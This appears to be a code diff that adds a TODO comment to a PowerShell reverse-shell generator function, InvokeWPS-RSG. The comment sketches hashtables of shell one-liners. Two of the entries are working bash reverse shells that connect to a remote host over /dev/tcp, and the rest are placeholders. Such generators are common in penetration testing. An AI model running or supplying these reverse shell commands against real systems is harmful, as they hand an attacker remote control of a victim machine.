@@ -6,6 +6,53 @@ Function Global:InvokeWPS-RSG()
     [String] $RPort
     )
 
+
+#TODO
+<#
+
+Example of building these into hashtables - to return powershell-esque results
+
+$Linux_RevShells = 
+@{
+    Bash = 
+    'bash -i >& /dev/tcp/$RHost/$RPort 0>&1',
+    '0<&196;exec 196<>/dev/tcp/$RHost/$RPort; sh <&196 >&196 2>&196'
+
+
+    Netcat   = 
+    'example 1',
+    'example 2'
+
+    Python  = 
+    'example reverse shell 1',
+    'some content',
+    'etc'
+}
+
+$Windows_RevShells = 
+@{
+    PowerShell = 
+    'powershell.exe -magic blah',
+    'some other command'
+
+    Python   = 
+    'example 1',
+    'example 2'
+
+    Perl  = 
+    'example reverse shell 1',
+    'some content',
+    'etc'
+}
+
+Example execution for result: 
+Powershell.exe #> Windows_RevShells.Python
+[0]> example 1
+[1]> example 2
+
+#>
+
+
     if($RHost -and $RPort)
     {
         Write-Host "--------------------------------------------------------------------------------------------------------------------------" -ForegroundColor Black
